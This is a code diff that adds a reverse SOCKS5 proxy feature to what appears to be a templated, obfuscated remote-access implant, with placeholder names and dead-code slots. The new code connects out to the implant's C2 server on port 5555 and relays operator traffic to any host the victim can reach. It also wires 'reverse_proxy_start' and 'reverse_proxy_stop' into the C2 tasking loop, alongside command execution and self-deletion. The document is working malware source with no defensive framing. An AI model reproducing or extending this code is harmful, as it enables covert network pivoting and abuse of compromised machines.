@@ -111,6 +111,11 @@ class {class_name}:
             'days': {working_hours_days}
         }}
 
+        # Reverse proxy variables
+        self.{v_reverse_proxy_active} = False
+        self.{v_reverse_proxy_stop_event} = threading.Event()
+        self.{v_reverse_proxy_thread} = None
+
         {dead_code_2}
 
     def {m_encrypt_data}(self, data):
@@ -939,6 +944,14 @@ class {class_name}:
                             result = "[ERROR] Sleep interval must be a valid integer"
                         except Exception as e:
                             result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
+                    elif command == 'reverse_proxy_start':
+                        # Start reverse proxy in a separate thread
+                        proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
+                        proxy_thread.start()
+                        result = "[SUCCESS] Reverse proxy started."
+                    elif command == 'reverse_proxy_stop':
+                        self.{m_stop_reverse_proxy}()
+                        result = "[SUCCESS] Reverse proxy stopped."
                     else:
                         result = self.{m_exec}(command)
                     self.{m_submit_interactive_result}(task_id, result)
@@ -1056,6 +1069,14 @@ class {class_name}:
                                     result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
                             elif command.startswith('kill'):
                                 self.{m_self_delete}()
+                            elif command == 'reverse_proxy_start':
+                                # Start reverse proxy in a separate thread
+                                proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
+                                proxy_thread.start()
+                                result = "[SUCCESS] Reverse proxy started."
+                            elif command == 'reverse_proxy_stop':
+                                self.{m_stop_reverse_proxy}()
+                                result = "[SUCCESS] Reverse proxy stopped."
                             else:
                                 result = self.{m_exec}(command)
 
@@ -1093,6 +1114,259 @@ class {class_name}:
         self.{m_exit_interactive_mode}()
         # P2P functionality has been removed
         {dead_code_4}
+
+    def {m_start_reverse_proxy}(self):
+        if self.{v_reverse_proxy_active}:
+            return
+
+        self.{v_reverse_proxy_active} = True
+        self.{v_reverse_proxy_stop_event}.clear()
+
+        try:
+            import socket
+            import struct
+            import threading
+            import select
+
+            # Parse the C2 URL to get the host
+            if self.{v_current_c2_url}.startswith('https://'):
+                host = self.{v_current_c2_url}[8:]  # Remove 'https://'
+            else:
+                host = self.{v_current_c2_url}[7:]  # Remove 'http://'
+
+            # Extract host and port (we don't need c2_port for reverse proxy)
+            if ':' in host:
+                host, port_str = host.split(':', 1)
+
+            # Connect to the C2 server on port 5555 for reverse proxy
+            remote_addr = (host, 5555)
+
+            while self.{v_running} and not self.{v_reverse_proxy_stop_event}.is_set():
+                try:
+                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                    # Set timeout for connection attempt
+                    conn.settimeout(10)
+                    conn.connect(remote_addr)
+
+                    # Clear timeout for data transfer
+                    conn.settimeout(None)
+
+                    # Handle SOCKS5 protocol on this connection
+                    self.{m_handle_socks5}(conn)
+                    conn.close()
+
+                    # Check if stop was requested before reconnecting
+                    if self.{v_reverse_proxy_stop_event}.is_set():
+                        break
+
+                    time.sleep(2)  # Wait before reconnecting
+
+                except Exception:
+                    if self.{v_reverse_proxy_stop_event}.is_set():
+                        break
+                    time.sleep(5)  # Wait before retrying
+                    continue
+
+        except Exception:
+            pass
+        finally:
+            self.{v_reverse_proxy_active} = False
+
+    def {m_stop_reverse_proxy}(self):
+        if not self.{v_reverse_proxy_active}:
+            return
+
+        self.{v_reverse_proxy_stop_event}.set()
+
+        # Wait for the proxy to fully stop
+        import time
+        timeout = 10  # 10 second timeout
+        start_time = time.time()
+        while self.{v_reverse_proxy_active} and (time.time() - start_time) < timeout:
+            time.sleep(0.1)
+
+    def {m_handle_socks5}(self, server_conn):
+        try:
+            # Set timeout for initial handshake
+            server_conn.settimeout(30)
+
+            # Read greeting from client (should be from C2 server acting as SOCKS client)
+            greeting = server_conn.recv(2)
+            if not greeting or len(greeting) != 2 or greeting[0] != 0x05:
+                server_conn.close()
+                return
+
+            n_methods = greeting[1]
+            if n_methods <= 0 or n_methods > 255:
+                server_conn.close()
+                return
+
+            # Read the methods
+            methods = server_conn.recv(n_methods)
+            if not methods:
+                server_conn.close()
+                return
+
+            # Send response: version 5, no authentication
+            server_conn.sendall(b'\x05\x00')
+
+            # Clear timeout for main connection
+            server_conn.settimeout(None)
+
+            # Handle multiple SOCKS requests over the same connection
+            while True:
+                # Read request header
+                header = server_conn.recv(4)
+                if not header or len(header) != 4 or header[0] != 0x05:
+                    break
+
+                cmd = header[1]
+                if cmd != 0x01:  # CONNECT command only
+                    # Send error response
+                    server_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
+                    continue
+
+                addr_type = header[3]
+
+                # Read address and port
+                if addr_type == 0x01:  # IPv4
+                    addr_bytes = server_conn.recv(4)
+                    port_bytes = server_conn.recv(2)
+                    if not addr_bytes or not port_bytes:
+                        break
+                    addr = socket.inet_ntoa(addr_bytes)
+                elif addr_type == 0x03:  # Domain name
+                    addr_len = ord(server_conn.recv(1))
+                    addr_bytes = server_conn.recv(addr_len)
+                    if not addr_bytes:
+                        break
+                    addr = addr_bytes.decode('utf-8')
+
+                    port_bytes = server_conn.recv(2)
+                    if not port_bytes:
+                        break
+                    # Agent-side DNS resolution - prefer IPv4 then IPv6
+                    resolved_addr = None
+                    try:
+                        import socket
+                        # Try IPv4 first
+                        try:
+                            result = socket.getaddrinfo(addr, None, socket.AF_INET, socket.SOCK_STREAM)
+                            for res in result:
+                                ip = res[4][0]
+                                if ip and not (ip.startswith("0.") or ip.startswith("169.254")):  # Skip invalid IPs
+                                    resolved_addr = ip
+                                    break
+                        except:
+                            pass
+
+                        # If IPv4 failed, try IPv6
+                        if not resolved_addr:
+                            try:
+                                result = socket.getaddrinfo(addr, None, socket.AF_INET6, socket.SOCK_STREAM)
+                                for res in result:
+                                    ip = res[4][0]
+                                    if ip and not ip.startswith("fe80"):  # Skip link-local IPv6
+                                        resolved_addr = ip
+                                        break
+                            except:
+                                pass
+                    except:
+                        pass
+
+                    if not resolved_addr:
+                        # Send error response for DNS failure
+                        server_conn.sendall(b'\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00')  # Host unreachable
+                        continue
+                    else:
+                        addr = resolved_addr
+                elif addr_type == 0x04:  # IPv6
+                    addr_bytes = server_conn.recv(16)
+                    port_bytes = server_conn.recv(2)
+                    if not addr_bytes or not port_bytes:
+                        break
+                    addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
+                else:
+                    # Send error response
+                    server_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
+                    continue
+
+                port = struct.unpack('>H', port_bytes)[0]
+
+                # Connect to target
+                try:
+                    target_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_conn.connect((addr, port))
+
+                    # Send success response
+                    server_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
+
+                    # Relay data between server connection and target connection
+                    self.{m_relay_data}(server_conn, target_conn)
+
+                except Exception:
+                    # Send connection refused response
+                    server_conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
+                    # Continue to accept next SOCKS request on same server connection
+                    continue
+
+        except Exception:
+            pass
+        finally:
+            try:
+                server_conn.close()
+            except:
+                pass
+
+    def {m_relay_data}(self, conn1, conn2):
+        import threading
+
+        def relay(src, dst, name1, name2):
+            try:
+                while True:
+                    data = src.recv(4096)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except Exception:
+                pass
+            finally:
+                # Properly close write side to signal end of data
+                try:
+                    if hasattr(socket, 'SHUT_WR'):
+                        src.shutdown(socket.SHUT_RD)  # Stop reading on source
+                        dst.shutdown(socket.SHUT_WR)  # Stop writing to destination
+                    else:
+                        src.close()
+                        dst.close()
+                except:
+                    try:
+                        src.close()
+                        dst.close()
+                    except:
+                        pass
+
+        # Start two threads for bidirectional relay
+        thread1 = threading.Thread(target=relay, args=(conn1, conn2, "conn1", "conn2"), daemon=True)
+        thread2 = threading.Thread(target=relay, args=(conn2, conn1, "conn2", "conn1"), daemon=True)
+
+        thread1.start()
+        thread2.start()
+
+        # Wait for both threads to complete
+        thread1.join(timeout=60)
+        thread2.join(timeout=60)
+
+        # Ensure both connections are closed
+        try:
+            conn1.close()
+        except:
+            pass
+        try:
+            conn2.close()
+        except:
+            pass
 
 if __name__ == '__main__':
     try:
